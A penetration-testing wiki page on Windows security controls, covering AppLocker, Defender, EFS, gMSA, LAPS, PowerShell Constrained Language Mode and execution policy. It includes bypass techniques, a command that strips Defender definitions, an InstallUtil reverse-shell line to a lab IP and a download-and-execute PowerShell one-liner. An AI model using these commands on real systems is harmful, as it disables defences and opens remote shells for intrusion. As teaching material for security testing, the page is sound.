# Windows Security Controls

{{#include ../banners/hacktricks-training.md}}

## AppLocker Policy

An application whitelist is a list of approved software applications or executables that are allowed to be present and run on a system. The goal is to protect the environment from harmful malware and unapproved software that does not align with the specific business needs of an organization.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft's **application whitelisting solution** and gives system administrators control over **which applications and files users can run**. It provides **granular control** over executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers.\
It is common for organizations to **block cmd.exe and PowerShell.exe** and write access to certain directories, **but this can all be bypassed**.

### Check

Check which files/extensions are blacklisted/whitelisted:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

`Test-AppLockerPolicy` evaluates candidate files for a specific identity against an AppLocker policy. Test the account whose token will execute the payload because rules can target users or groups; `Get-AppLockerFileInformation` is also useful to inspect the path, hash, and publisher metadata on which rules may match.<sup>[[5]](#references)</sup>

```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```

Before treating a denied test result as an enforced block, inspect the **effective enforcement mode of that rule collection** and the Application Identity service. `AuditOnly` evaluates rules but still permits execution, while `NotConfigured` is not equivalent to disabled when that collection contains rules.<sup>[[7]](#references)</sup> A stopped `AppIDSvc` prevents AppLocker enforcement.<sup>[[9]](#references)</sup> These checks distinguish an actual bypass from a policy that never blocked the file.

```powershell
(Get-AppLockerPolicy -Effective).RuleCollections | Select-Object CollectionType, EnforcementMode
Get-Service AppIDSvc
Get-AppLockerFileInformation -EventLog -EventType Audited -Statistics
```

For a controlled execution test, compare the AppLocker event log: **8003/8006** mean the EXE/DLL or script/MSI would have been blocked in audit mode; **8004/8007** mean it was actually blocked. Test the same file type and identity as the intended execution path.<sup>[[8]](#references)</sup>

This registry path contains the configurations and policies applied by AppLocker, providing a way to review the current set of rules enforced on the system:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Useful **Writable folders** to bypass AppLocker Policy: If AppLocker is allowing to execute anything inside `C:\Windows\System32` or `C:\Windows` there are **writable folders** you can use to **bypass this**.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- Commonly **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries can be also useful to bypass AppLocker.
- **Poorly written rules could also be bypassed**
  - For example, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, you can create a **folder called `allowed`** anywhere and it will be allowed.
  - Organizations also often focus on **blocking the `%System32%\WindowsPowerShell\v1.0\powershell.exe` executable**, but forget about the **other** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) such as `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`.
- **DLL enforcement very rarely enabled** due to the additional load it can put on a system, and the amount of testing required to ensure nothing will break. So using **DLLs as backdoors will help bypassing AppLocker**.
- You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass AppLocker. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).<sup>[[1]](#references)</sup>

## Credentials Storage

### Security Accounts Manager (SAM)

Local credentials are present in this file, the passwords are hashed.

### Local Security Authority (LSA) - LSASS

The **credentials** (hashed) are **saved** in the **memory** of this subsystem for Single Sign-On reasons.\
**LSA** administrates the local **security policy** (password policy, users permissions...), **authentication**, **access tokens**...\
LSA will be the one that will **check** for provided credentials inside the **SAM** file (for a local login) and **talk** with the **domain controller** to authenticate a domain user.

The **credentials** are **saved** inside the **process LSASS**: Kerberos tickets, hashes NT and LM, easily decrypted passwords.

### LSA secrets

LSA could save in disk some credentials:

- Password of the computer account of the Active Directory (unreachable domain controller).
- Passwords of the accounts of Windows services
- Passwords for scheduled tasks
- More (password of IIS applications...)

### NTDS.dit

It is the database of the Active Directory. It is only present in Domain Controllers.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) is an Antivirus that is available in Windows 10 and Windows 11, and in versions of Windows Server. It **blocks** common pentesting tools such as **`WinPEAS`**. However, there are ways to **bypass these protections**.

### Check

To check the **status** of **Defender** you can execute the PS cmdlet **`Get-MpComputerStatus`** (check the value of **`RealTimeProtectionEnabled`** to know if it's active):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

To enumerate it you could also run:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Encrypted File System (EFS)

EFS secures files through encryption, utilizing a **symmetric key** known as the **File Encryption Key (FEK)**. This key is encrypted with the user's **public key** and stored in the file's NTFS `$EFS` metadata (`$LOGGED_UTILITY_STREAM`), **not** an ordinary `$DATA` alternate data stream.<sup>[[10]](#references)</sup> When decryption is needed, the corresponding **private key** of the user's digital certificate unwraps the FEK. A configured data recovery agent (DRA) has a separate encrypted copy of the FEK in the Data Recovery Field.<sup>[[13]](#references)</sup>

**Decryption scenarios without user initiation** include:

- When files or folders are moved to a non-EFS file system, like [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), they are automatically decrypted.
- Encrypted files sent over the network via SMB/CIFS protocol are decrypted prior to transmission.

This encryption method allows **transparent access** to encrypted files for the owner. However, simply changing the owner's password and logging in will not permit decryption.

**Key Takeaways**:

- EFS uses a symmetric FEK, encrypted with the user's public key.
- Decryption employs the user's private key to access the FEK.
- Automatic decryption occurs under specific conditions, like copying to FAT32 or network transmission.
- Encrypted files are accessible to the owner without additional steps.

### Check EFS info

Do not infer EFS use from `%APPDATA%\Microsoft\Protect`: it stores DPAPI master keys for many Windows features.<sup>[[19]](#references)</sup> Instead, inspect an encrypted file with `cipher /c "C:\path\file"` to list its user and recovery certificates. `cipher /e` and `cipher /d` encrypt and decrypt files for a principal that has the matching private key.<sup>[[11]](#references)</sup>

### Decrypting EFS files

If `cipher /c` lists a recovery certificate and you have its **matching DRA private key** in a PFX, import that PFX into the current user's certificate store, then decrypt the file.<sup>[[11]](#references)[[12]](#references)</sup> A newly generated DRA certificate cannot decrypt older files: its public key must already have been included when the file was encrypted. NTFS ACL access or a reset account password alone does not supply the required private key.<sup>[[13]](#references)</sup>

```cmd
cipher /c "C:\path\file"
certutil -user -importPFX My recovery.pfx
cipher /d "C:\path\file"
```

#### Being Authority System

This approach requires the **victim user** to be **running** a **process** on the host. If so, from a `meterpreter` session you can impersonate the user's process token (`impersonate_token` from `incognito`). Alternatively, you can `migrate` into the user's process.

#### Knowing the User's Password

Mimikatz can import the user's certificate and private key, then use them to decrypt EFS-protected files.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft developed **Group Managed Service Accounts (gMSA)** to simplify the management of service accounts in IT infrastructures. Unlike traditional service accounts that often have the "**Password never expire**" setting enabled, gMSAs offer a more secure and manageable solution:

- **Automatic Password Management**: gMSAs use a complex, 240-byte password that normally rotates every 30 days. Domain controllers derive it using KDS key material, eliminating manual password updates.<sup>[[16]](#references)[[20]](#references)</sup>
- **Enhanced Security**: These accounts are immune to lockouts and cannot be used for interactive logins, enhancing their security.
- **Multiple Host Support**: gMSAs can be shared across multiple hosts, making them ideal for services running on multiple servers.
- **Scheduled Task Capability**: Unlike managed service accounts, gMSAs support running scheduled tasks.
- **Simplified SPN Management**: The system automatically updates the Service Principal Name (SPN) when there are changes to the computer's sAMaccount details or DNS name, simplifying SPN management.

A domain controller constructs the LDAP attribute _**msDS-ManagedPassword**_ on read from KDS-derived password material; the value is not an independently stored password. It normally changes every 30 days.<sup>[[20]](#references)</sup> The returned [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) is **not an encrypted password**: its `CurrentPassword` field contains the cleartext password.<sup>[[14]](#references)</sup> Access is checked against `msDS-GroupMSAMembership`, so any principal granted retrieval rights is in scope, not just administrators or the service hosts.<sup>[[15]](#references)</sup> The LDAP connection must provide confidentiality, for example through LDAPS or SASL sealing.<sup>[[20]](#references)</sup>

For offline password derivation after KDS root-key exposure, see [Golden gMSA/dMSA](active-directory-methodology/golden-dmsa-gmsa.md).

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

You can read this password with [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**

```
/GMSAPasswordReader --AccountName jkohler
```

[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Also, check this [web page](https://cube0x0.github.io/Relaying-for-gMSA/) about how to perform a **NTLM relay attack** to **read** the **password** of **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

Distinguish **legacy Microsoft LAPS** from the native **Windows LAPS** implementation during enumeration. Windows LAPS shipped in the April 11, 2023 Windows updates and can back up a managed local administrator password to **Windows Server Active Directory** or **Microsoft Entra ID**. In AD-backed deployments it can additionally encrypt passwords, retain encrypted password history, and manage a domain controller's DSRM password. The downloadable legacy MSI is deprecated on newer Windows versions, although Windows LAPS can operate in legacy-emulation mode.<sup>[[6]](#references)</sup>

Because legacy Microsoft LAPS and Windows LAPS are separate implementations, identify which one is deployed before applying attribute- or cmdlet-specific attacks. The linked page covers discovery, ACL enumeration, retrieval, expiration manipulation, and offline recovery without duplicating those procedures here.<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **locks down many of the features** needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more.

### **Check**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

`powershell.exe -Version 2` was a legacy downgrade only on hosts with the optional PowerShell 2 engine installed. It is no longer included in updated Windows 11 24H2 or Windows Server 2025; do not treat it as a current CLM bypass.<sup>[[17]](#references)</sup> Under application control, PowerShell runs untrusted code in Constrained Language, while policy-trusted scripts can run in Full Language.<sup>[[18]](#references)</sup>

For older configurations, you can use [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**To compile it you may need** **to** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> add `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` and **change the project to .Net4.5**.

#### Direct bypass:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass the constrained mode. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).<sup>[[1]](#references)</sup>

## PS Execution Policy

By default it is set to **restricted.** Main ways to bypass this policy:<sup>[[4]](#references)</sup>

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

Is the API that can be use to authenticate users.

The SSPI will be in charge of finding the adequate protocol for two machines that want to communicate. The preferred method for this is Kerberos. Then the SSPI will negotiate which authentication protocol will be used, these authentication protocols are called Security Support Provider (SSP), are located inside each Windows machine in the form of a DLL and both machines must support the same to be able to communicate.

### Main SSPs

- **Kerberos**: The preferred one
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** and **NTLMv2**: Compatibility reasons
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers and LDAP, password in form of a MD5 hash
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL and TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: It is used to negotiate the protocol to use (Kerberos or NTLM being Kerberos the default one)
  - %windir%\Windows\System32\lsasrv.dll

#### The negotiation could offer several methods or only one.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a **consent prompt for elevated activities**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}




## References

- [1] [Bypassing AppLocker and PowerShell constrained language mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [howto ~ decrypt EFS files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying for gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 Ways to Bypass the PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [Use the AppLocker Windows PowerShell cmdlets](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Windows LAPS overview](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [7] [Working with AppLocker rules](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/working-with-applocker-rules)
- [8] [Using Event Viewer with AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/using-event-viewer-with-applocker)
- [9] [AppLocker processes and interactions](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/applocker-processes-and-interactions)
- [10] [File streams (local file systems)](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams)
- [11] [Cipher command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cipher)
- [12] [Certutil command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Back up recovery agent EFS private key](https://learn.microsoft.com/en-us/troubleshoot/windows-server/certificates-and-public-key-infrastructure-pki/back-up-recovery-agent-efs-private-key)
- [14] [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)
- [15] [ms-DS-GroupMSAMembership attribute](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [16] [Secure group managed service accounts](https://learn.microsoft.com/en-us/entra/architecture/service-accounts-group-managed)
- [17] [Features removed from Windows client](https://learn.microsoft.com/en-us/windows/whats-new/removed-features)
- [18] [Use App Control to secure PowerShell](https://learn.microsoft.com/en-us/powershell/scripting/security/app-control/application-control)
- [19] [Event 4693 and DPAPI master keys](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4693)
- [20] [msDS-ManagedPassword construction](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/9cd2fc5e-7305-4fb8-b233-2a60bc3eec68)
{{#include ../banners/hacktricks-training.md}}
